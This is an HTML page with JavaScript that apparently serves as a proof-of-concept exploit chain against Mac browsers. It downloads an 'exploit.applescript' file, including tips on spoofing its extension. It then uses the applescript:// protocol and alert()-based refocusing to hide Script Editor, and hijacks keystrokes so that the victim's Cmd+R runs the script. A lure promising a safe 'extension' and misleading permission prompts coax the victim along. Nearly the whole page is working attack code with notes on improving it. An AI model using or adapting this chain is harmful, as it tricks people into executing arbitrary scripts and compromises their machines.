<html>

<body>
    <!-- 
        Download protection bypass = i.e. attacker could download `.scpt` and `.applescript`
        To run Applescript, that should be considered as "shell scripting language" 
    -->
    <!-- Change focus using pseudoprotocol = e.g. could quickly change focus from Chrome to Script Editor using `applescript://` -->
    <!-- Prevent redirect = page navigation to `applescript://` prevents reload -->
    <!-- Window re-focusing via alert() -->
    <script>
        const APPLESCRIPT_PROTOCOL = 'applescript://'
        // Allowed extensions. .applescript looks dangerous, 
        // So it's possible to use .scpt to spoof filename.
        const EXPLOIT_URL = 'exploit.applescript' || 'exploit.scpt' || 'exploit.scptd'
        // Just a visible content node's name
        const UI_ACTIVE_CONTENT = 'UI_ACTIVE_CONTENT'
        // If we've already known how user's browser handles `applescript:` links
        // We don't need to open new tab in `requestApplescriptPermissions()`
        const APPLESCRIPT_IS_ALREADY_ALLOWED = true
        // Before running in real-life, please check keycodes one more time.
        const CMD_KEYCODES = [91, 93]
        const R_KEYCODE = 82
        // Last pressed keyCode during pressing CMD + R (+ R)
        let LAST_PRESSED_KEYCODE = ''
        // 
        actions = {
            ui: {
                showHelper: UI_showHelper
            },

            applescript: {
                downloadExploit: downloadApplescriptExploit,
                requestApplescriptPermissions: requestApplescriptPermissions,
                registerOnKeyDownHook: registerOnKeyDownHook
            },

            blur: {
                disable: disableOnBlur,
                activate: activateOnBlur
            }
        }


        function registerOnKeyDownHook() {
            return new Promise((resolve) => {
                // NOTE: keyboards hijacking part was simplified compared to more advanced cases with onkeypress. So it's possible to develop an exploit for most behaviors using onkeypress + onkeydown, counting number of presses/time of presses, etc.
                window.onkeydown = (e) => {
                    e.preventDefault()
                    const currentKeyCode = e.keyCode
                    const isPrevCmd = CMD_KEYCODES.includes(LAST_PRESSED_KEYCODE)
                    const isCurrentR = R_KEYCODE === currentKeyCode
                    const isCurrentCMD = CMD_KEYCODES.includes(currentKeyCode)
                    if (R_KEYCODE === currentKeyCode) {
                        // we could detect fullscreen based on user agent and inner width
                        let fullScreen = false
                        if (fullScreen) {
                            // https://productforums.google.com/forum/#!topic/chrome/wnjc4bflKFI
                            // https://bugzilla.mozilla.org/show_bug.cgi?id=803675
                            // All browsers on Mac open popups in tabs, when browser window is in fullscreen mode
                            alert('Sorry, it does not support mac fullscreen mode. Exit fullscreen mode and try again.')
                        } else {
                            // it's possible to prevent refresh using
                            // window.open(APPLESCRIPT_PROTOCOL, '_top')
                            // because APPLESCRIPT_PROTOCOL is "unnaccessible" and navigation prevented
                            window.open(APPLESCRIPT_PROTOCOL, '_top')
                        }

                        resolve(true)
                    }
                    LAST_PRESSED_KEYCODE = currentKeyCode
                }

                // User has to press exactly Cmd + R, not R + CMD, however, itâ€™s not a problem, it could be solved using `onkeypress`.
            })
        }

        function requestApplescriptPermissions() {
            return new Promise((resolve) => {
                // Don't run this step if we know that
                // Browser already handles `applescript:` links
                // The best case.
                if (APPLESCRIPT_IS_ALREADY_ALLOWED) {
                    return resolve()
                }

                // Ask user to allow `applescript:`
                alert('Please, click "Always open these type of links in the associated app" in the next window.')
                win = window.open(APPLESCRIPT_PROTOCOL, '_target')

                let it = setInterval(() => {
                    try {
                        win.location.href
                    } catch (e) {
                        resolve()
                    }
                }, 10)

                // Warns user about permission, if it declines it
                // NOTE: Looks like it's possible to track system alert fires using mouse
                let setT = setTimeout(() => {
                    try {
                        win.alert("We need this permission to deliver you first-class experience :) Please, click this checkbox and restart if something doesn\'t work for you.")
                        win.close()
                        clearInterval(it)
                        resolve()
                    } catch (e) { }
                }, 1000)
            })
        }

        // just a small util to show CMD+R shortcut
        function UI_showHelper() {
            return new Promise((resolve) => {
                document.getElementById(UI_ACTIVE_CONTENT).innerHTML = `
                    <h1>Great!</h1> 
                    <h2>Please, press CMD and hit R + R quickly.</h2>
                    <h5>"press CMD + hit "R" twice" could be improved using technique from <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=637098">this bug</a>. i.e. by tuning window.onkeypress and window.onkeydown hooks. </h5>

                `
                resolve(true)
            })
        }

        function downloadApplescriptExploit() {
            return new Promise((resolve) => {
                let a = document.createElement('a')
                a.href = EXPLOIT_URL
                a.download = 'exploit.applescript'
                a.target = '_blank'
                a.click()
                resolve(true)
            })
        }

        function activateOnBlur() {
            return new Promise((resolve) => {
                // Prevent user from seeing "Script Editor"'s content
                window.onblur = () => {
                    // Focusing using `alert()`, 
                    // Hides "Script Editor" after opening `exploit.applescript`
                    // NOTE: Alert or another ui action (prompt/confirm) is required
                    // However, it's possible to bypass sync alert and close it 
                    // As soon as page alert loads.
                    // As far as I remember bypass is similar to
                    // window -> new tab -> tab.alert -> tab.remove()
                    window.alert('Great! If you see this alert, that means you opened the file or triggered onblur somehow.')
                    return resolve()
                    // Also, "Script Editor" could be seen for a few milliseconds in the case and only in the case
                    // IF IT WAS INITIALIZED BEFORE, NOT INITIALIZING NOW (exploit opening) 
                    // So everything is ok, keep calm
                }
            })
        }

        function disableOnBlur() {
            return new Promise((resolve) => {
                // Remove `onblur` hook from activateOnBlur
                window.onblur = null
                resolve(true)
            })
        }

        function triggerFullCycle() {
            // Written as a chain of actions, needs better error handling
            actions.applescript.requestApplescriptPermissions()
                .then(actions.applescript.downloadExploit)
                .then(actions.blur.activate)
                .then(actions.blur.disable)
                .then(actions.ui.showHelper)
                .then(actions.applescript.registerOnKeyDownHook)
            // .catch(err => console.error(err))

        }

    </script>

    <div id="UI_ACTIVE_CONTENT">
        <h2>Could you download our extension? It's save, like Flash, but for Mac.</h2>
        <h3>Click on the file's tab in the toolbar below right after download.</h3>
        <button onclick="triggerFullCycle()">Run!</button>
    </div>

</body>

</html>